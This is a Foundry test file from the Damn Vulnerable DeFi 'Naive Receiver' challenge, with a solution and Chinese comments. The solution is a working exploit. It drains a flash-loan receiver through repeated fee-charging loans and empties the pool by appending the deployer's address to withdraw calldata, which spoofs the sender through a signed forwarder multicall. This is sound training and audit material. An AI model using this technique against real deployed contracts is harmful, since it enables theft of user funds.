// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        // 设置调用者，并拥有eth
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        // 存入 10 weth
        weth.deposit{value: WETH_IN_RECEIVER}(); 
        // 向 receiver 转入
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL); // 1000
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER); // 10

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        // 非 pool 合约调用，revert
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // // 不能这样调用，多笔交易nonce不满足
        // for (uint256 i = 0; i < 10 ; i++) {
        //     pool.flashLoan(
        //         receiver,
        //         address(weth), // token
        //         0, // amount
        //         bytes("") // data
        //     );
        // }

        /*
            构造 10 笔 flashLoan 交易
        */
        bytes[] memory callDatas = new bytes[](11);
        for(uint i = 0; i < 10; i++) {
            // 通过10笔交易flashLoan调用，就能将 10 个 ETH 作为手续费传入池子中
            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
        }
        /*
            构造 1 笔 withdraw 交易
        */ 
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            // 必须是有余额的账户， deployer 即为 NaiveReceiverPooll.feeReceiver
            // ?? 编码后格式？
            deployer // 需要拼凑 calldata，通过 _msgSender() 指定地址
        );

        /*
            构造 request, 调用 multical
        */ 
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 3000000,
            nonce: 0,
            data: abi.encodeCall(pool.multicall, (callDatas)),
            deadline: block.timestamp + 1
        });

        /*
            构造 signature
        */

        // ??
        // 根据 BasicForwarder 合约中的验签算法反推
        bytes32 requestDigest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestDigest);
        bytes memory signature = abi.encodePacked(r, s, v);

        /*
            执行转发合约的 execute(request, signature)
        */
        require(forwarder.execute(request, signature));

        console.log("receiver eth: %e", weth.balanceOf(address(receiver)));
        console.log("pool eth: %e", weth.balanceOf(address(pool)));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        // 要求 receiver 的 eth 为空
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        // 要求 pool 中 eth 为空
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
